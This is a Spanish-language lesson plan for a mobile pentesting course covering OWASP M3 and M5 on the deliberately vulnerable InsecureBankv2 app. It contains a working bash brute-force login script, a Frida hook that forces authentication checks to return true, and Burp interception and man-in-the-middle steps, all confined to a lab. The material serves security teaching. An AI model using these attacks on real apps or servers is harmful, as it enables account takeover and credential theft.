# Clase 2 — OWASP Mobile Top 10: M3 y M5

> **Estado del documento:** guion preparado para la sesión de aula. Todas las
> salidas y referencias de código marcadas como «salida real» deben
> verificarse contra la VM antes de impartir la clase, igual que se hizo con
> la Clase 1 (`docs/clases/clase-1-evidencia.md`).

| | |
|---|---|
| **App objetivo** | InsecureBankv2 (`com.android.insecurebankv2`) |
| **Proyecto** | Dinesh Shetty — referenciado por OWASP MASTG como `MASTG-APP-0010` |
| **Dispositivo** | VM Android-x86, API 27, por ADB |
| **Duración prevista** | 90 minutos |
| **Riesgos** | M3 Insecure Authentication · M5 Insecure Communication |
| **Requisitos** | Burp Suite (proxy) · `frida-server` (instrumentación) |

## Índice

- [Antes de impartir la clase](#antes-de-impartir-la-clase)
- [Fase 0 — Preparación](#fase-0--preparación)
- [Fase 1 — M3: Autenticación insegura](#fase-1--m3-autenticación-insegura)
  - [1.1 Observar el login](#11-observar-el-login)
  - [1.2 Ataque de fuerza bruta](#12-ataque-de-fuerza-bruta)
  - [1.3 Bypass de autenticación con Frida](#13-bypass-de-autenticación-con-frida)
- [Fase 2 — M5: Comunicación insegura](#fase-2--m5-comunicación-insegura)
  - [2.1 Interceptar tráfico con Burp](#21-interceptar-tráfico-con-burp)
  - [2.2 Analizar el canal](#22-analizar-el-canal)
  - [2.3 Ataque Man-in-the-Middle](#23-ataque-man-in-the-middle)
- [Cierre](#cierre)
- [Anexo A — Referencias de código](#anexo-a--referencias-de-código)
- [Anexo B — Comandos del laboratorio](#anexo-b--comandos-del-laboratorio)

---

## Antes de impartir la clase

> ⚠️ **Esta clase requiere Burp Suite y frida-server.** Asegúrate de que ambos
> funcionan antes de empezar.

### Requisitos previos

| Componente | Estado | Verificación |
|---|---|---|
| Burp Suite | Instalado y ejecutándose | `burpsuite --listen 0.0.0.0:8080` |
| frida-server | Corriendo en la VM | `frida-ps -Uai` lista las apps |
| Backend InsecureBankv2 | Activo en puerto 8888 | `bank-status` |
| App InsecureBankv2 | Instalada y configurada | `clase1-prep` (de la Clase 1) |

### Credenciales de la app

| Usuario | Contraseña | Nota |
|---|---|---|
| `dinesh` | `Dinesh@123$` | Usuario normal |
| `jack` | `Jack@123$` | Segundo usuario |
| `devadmin` | `devadmin` | Entra por `/devlogin` |

---

## Fase 0 — Preparación

```bash
# 1. Verificar que el backend está activo
bank-status

# 2. Conectar con la VM y activar root
vmconnect

# 3. Verificar que frida-server está corriendo
frida-ps -Uai

# 4. Arrancar Burp Suite (en una terminal aparte)
burpsuite --listen 0.0.0.0:8080
```

Si `frida-ps -Uai` no lista las apps, reinicia frida-server:

```bash
adb -s 172.25.208.100:5555 shell '/data/local/tmp/frida-server-android-x86_64 &'
```

---

## Fase 1 — M3: Autenticación insegura

> M3 no es «una app sin OAuth». Es **cómo la app verifica que eres quien dices
> ser**. Y en InsecureBankv2, la respuesta es: no lo verifica bien.

### 1.1 Observar el login

Lo primero es entender qué hace la app cuando alguien intenta entrar.

**En el dispositivo:**

```bash
# Limpiar el log y ver los logs de la app
adb logcat -c
adb logcat | grep -E "Login|Auth|Password|dinesh"
```

**En la app:**
1. Abrir InsecureBankv2
2. Introducir credenciales incorrectas: `test` / `test123`
3. Observar qué pasa

**Hallazgo:** La app no tiene límite de intentos. Puedes probar mil contraseñas
y la app nunca se bloquea, nunca se ralentiza, nunca avisa.

> **¿Por qué es M3?** Un atacante puede probar miles de contraseñas por minuto.
> No hay rate limiting, no hay CAPTCHA, no hay bloqueo tras N intentos fallidos.

### 1.2 Ataque de fuerza bruta

Vamos a probar cuántas combinaciones podemos intentar en 30 segundos.

**Script de ataque (en el servidor):**

```bash
#!/usr/bin/env bash
# ataque_fuerza_bruta.sh - Demostración de M3
# ATENCIÓN: solo para el laboratorio. No uses esto contra sistemas reales.

URL="http://127.0.0.1:8888/login"
USUARIOS=("dinesh" "jack" "devadmin" "admin" "root")
PASSWORDS=("123456" "password" "Dinesh@123$" "Jack@123$" "devadmin" "admin" "toor" "qwerty")

echo "Iniciando ataque de fuerza bruta contra ${URL}"
echo "Usuarios: ${#USUARIOS[@]} | Contraseñas: ${#PASSWORDS[@]}"
echo "Total combinaciones: $(( ${#USUARIOS[@]} * ${#PASSWORDS[@]} ))"
echo

for user in "${USUARIOS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        RESPUESTA=$(curl -s -X POST -d "username=${user}&password=${pass}" "$URL")
        if echo "$RESPUESTA" | grep -q "Correct Credentials"; then
            echo "[+] ÉXITO: ${user}:${pass}"
            echo "    Respuesta: $RESPUESTA"
        else
            echo "[-] Fallo: ${user}:${pass}"
        fi
    done
done
```

**Resultado esperado:**

```
[+] ÉXITO: dinesh:Dinesh@123$
    Respuesta: {"message": "Correct Credentials", "user": "dinesh"}
```

> **¿Por qué funciona?** La app no tiene:
> - Rate limiting (límite de intentos por minuto)
> - Bloqueo tras N intentos fallidos
> - CAPTCHA o verificación adicional
> - Notificación al usuario de intentos sospechosos

### 1.3 Bypass de autenticación con Frida

Ahora vamos a ir más allá: no necesitamos la contraseña si podemos modificar
el comportamiento de la app en tiempo de ejecución.

**Antes de escribir el hook:** localizar el método que valida las credenciales
en el código descompilado de la Clase 1.

```bash
grep -RniE "checkCredentials|Correct Credentials|username.*password" \
  ~/mobile-pentesting-lab/reports/jadx/InsecureBankv2/sources
```

El script de ejemplo debe adaptarse al método real encontrado:

```javascript
// hook_login.js - Bypass de autenticación M3
// Sustituye <Clase> y <método> por los identificadores reales del código.
Java.perform(() => {
    const LoginClass = Java.use("<Clase>");

    LoginClass.<método>.implementation = function (username, password) {
        console.log("[*] Intento de login:");
        console.log("    Usuario: " + username);
        console.log("    Contraseña: " + password);
        console.log("[+] Validación forzada a true (BYPASSED)");
        return true;
    };

    console.log("[*] Hook instalado. Comprueba el efecto en la app.");
});
```

**Ejecutar el hook:**

```bash
# Con frida-server corriendo en la VM
frida -U -f com.android.insecurebankv2 -l hook_login.js --no-pause
```

**En la app:**
1. Abrir InsecureBankv2
2. Introducir cualquier credencial
3. Observar si el hook cambia el comportamiento de la app

> **¿Por qué es M3?** Si la autenticación se valida en el cliente, un atacante
> con acceso al dispositivo puede modificar la app y saltarse la autenticación.
> La regla es clara: **la autenticación debe validarse siempre en el servidor**.

---

## Fase 2 — M5: Comunicación insegura

> M5 es el riesgo que hace que tu app sea vulnerable a ataques de red. No importa
> qué tan buena sea tu autenticación si un atacante puede ver y modificar el
> tráfico entre la app y el servidor.

### 2.1 Interceptar tráfico con Burp

**Configurar el proxy en la VM Android:**

```bash
# En el servidor: Burp debe escuchar en 0.0.0.0:8080
# (Ya lo arrancamos con: burpsuite --listen 0.0.0.0:8080)

# Configurar el proxy en la VM
adb shell settings put global http_proxy 172.25.208.104:8080
```

**Verificar que el tráfico pasa por Burp:**

1. Abrir Burp Suite → pestaña "Proxy" → "Intercept"
2. Activar "Intercept is on"
3. En la app, intentar hacer login con cualquier credencial
4. En Burp, verás la petición HTTP capturada

**Tráfico interceptado (adaptar al formato real del backend):**

```http
POST /login HTTP/1.1
Host: 172.25.208.104:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

username=dinesh&password=Dinesh@123$
```

> **¿Qué vemos?** Usuario y contraseña en claro. Cualquiera que intercepte el
> tráfico puede ver las credenciales.

### 2.2 Analizar el canal

**Preguntas clave:**

| Pregunta | Respuesta en InsecureBankv2 |
|---|---|
| ¿Usa HTTPS? | No, HTTP plano |
| ¿Hay certificate pinning? | No |
| ¿Los datos van cifrados? | No |
| ¿Un MITM puede modificar el tráfico? | Sí, sin dificultad |

**Verificar que no hay cifrado:**

```bash
# En el servidor: ver qué protocolo usa el backend
curl -v http://127.0.0.1:8888/login 2>&1 | grep -E "Connected|SSL|TLS|HTTP"
```

> Comprobar que no aparece una negociación TLS. Todo el tráfico debe viajar en
> claro entre la app y el backend.

### 2.3 Ataque Man-in-the-Middle

Vamos a modificar el tráfico en tiempo real.

**En Burp:**
1. Pestaña "Proxy" → "Intercept"
2. Activar "Intercept is on"
3. En la app, intentar hacer login con `dinesh` / `Dinesh@123$`
4. En Burp, verás la petición capturada
5. Modificar el cuerpo de la petición (por ejemplo, cambiar el usuario)
6. Forward

**Resultado:** observar si la respuesta del backend acepta la modificación y si
la app la procesa sin ningún aviso.

> **¿Por qué es M5?** La app no verifica la identidad del servidor. No usa
> HTTPS, no tiene certificate pinning, y no detecta que el tráfico está siendo
> modificado. Un atacante puede:
> - Ver las credenciales en tránsito
> - Modificar las respuestas del servidor
> - Redirigir la app a un servidor malicioso

---

## Cierre

> Hemos recorrido dos de los riesgos más críticos del OWASP Mobile Top 10:
>
> - **M3 (Insecure Authentication):** la app no verifica bien quién entra. No
>   hay rate limiting ni bloqueo, y la validación cliente puede manipularse.
> - **M5 (Insecure Communication):** todo viaja en claro. Un atacante puede ver
>   y modificar el tráfico entre la app y el servidor.
>
> **La lección:** la autenticación y la comunicación son dos caras de la misma
> moneda. No sirve tener una buena autenticación si un atacante puede
> interceptarla. Y no sirve tener un canal seguro si la autenticación se puede
> saltar.

**Próxima clase:** M7 (Insecure Code Quality) y M8 (Code Tampering).

---

## Anexo A — Referencias de código

Las referencias exactas deben confirmarse con `jadx` y la app instalada. Estas
son las hipótesis de partida:

| Riesgo | Componente | Comprobación |
|---|---|---|
| M3 | `DoLogin.java` | Buscar la validación de credenciales y la ausencia de rate limiting |
| M3 | `app.py` del backend | Buscar el endpoint de login y la respuesta al cliente |
| M5 | `app.py` del backend | Comprobar que solo ofrece HTTP y no HTTPS |
| M5 | Código Java de la app | Buscar configuración de red y ausencia de certificate pinning |

---

## Anexo B — Comandos del laboratorio

| Comando | Función |
|---|---|
| `bank-status` | Estado del backend |
| `vmconnect` | Conecta con la VM y activa root |
| `vmconnect frida` | URL y comandos de frida-server |
| `frida-ps -Uai` | Lista apps instaladas en la VM |
| `burpsuite --listen 0.0.0.0:8080` | Arranca Burp escuchando en la red |
| `adb shell settings put global http_proxy IP:8080` | Configura proxy en la VM |

### Atajos de la demo

```bash
# M3: logs de login en vivo
adb logcat -c && adb logcat | grep -E "Login|Auth"

# M3: ataque de fuerza bruta
bash ataque_fuerza_bruta.sh

# M3: bypass con Frida
frida -U -f com.android.insecurebankv2 -l hook_login.js --no-pause

# M5: interceptar tráfico
# 1. Burp -> Proxy -> Intercept -> Intercept is on
# 2. En la app, hacer login
# 3. En Burp, ver la petición capturada

# M5: modificar tráfico en Burp
# 1. Click derecho en la petición -> "Send to Repeater"
# 2. Modificar el cuerpo de la petición
# 3. Click "Send"
```
